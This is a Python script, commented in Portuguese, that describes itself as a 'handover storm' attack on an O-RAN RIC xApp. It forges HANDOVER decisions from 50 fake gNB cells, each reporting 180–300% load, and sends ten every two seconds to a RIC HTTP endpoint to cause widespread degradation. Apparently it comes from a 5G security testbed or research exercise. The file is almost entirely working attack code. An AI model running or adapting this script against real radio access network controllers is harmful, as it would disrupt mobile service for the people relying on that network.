"""
ataque_handover_storm.py - Ataque de Tempestade de Handover (xApp)
Alvo: Decisão de Handover do xApp - multiplas celulas
Efeito: Simula 50 celulas gNB falsas, enviando 10 decisoes HANDOVER
        a cada 2 segundos. Cada celula reporta utilizacao >180%.
        Causa: tempestade de handover, degradacao generalizada.
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: HANDOVER STORM (xApp)")
print(f"  Alvo: {BASE_URL}")
print("  50 celulas falsas, 10 HANDOVERs a cada 2s")
print("=" * 60)

# 50 celulas gNB falsas
FAKE_CELLS = [f"gnb-{i:03d}" for i in range(1, 51)]

# Razões para o handover (variedade)
RAZOES = [
    "OVERLOAD", "HIGH_UTILIZATION", "CAPACITY_EXCEEDED",
    "LOAD_BALANCING", "INTERFERENCE", "ATTACK_TRIGGER"
]

def ataque_handover_storm():
    """Envia lotes de 10 decisoes HANDOVER falsas"""
    while True:
        try:
            # Seleciona 10 celulas aleatorias
            for cell in random.sample(FAKE_CELLS, 10):
                load = random.randint(180, 300)
                
                ataque = {
                    "id": "xapp-traffic",
                    "decision": "HANDOVER",
                    "cell_id": cell,
                    "reason": random.choice(RAZOES),
                    "load_mbps": load,
                    "capacity_mbps": 100,
                    "utilization_pct": f"{load}%",
                    "target_cell": f"gnb-{random.randint(51, 100):03d}",
                    "timestamp": time.time()
                }
                
                data = json.dumps(ataque).encode()
                req = urllib.request.Request(BASE_URL, data=data, method="POST")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=2): pass
            
            print(f"  [HandoverStorm] 10 HANDOVER falsos enviados")
            time.sleep(2)
            
        except Exception as e:
            print(f"[HandoverStorm] Erro: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ataque_handover_storm()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)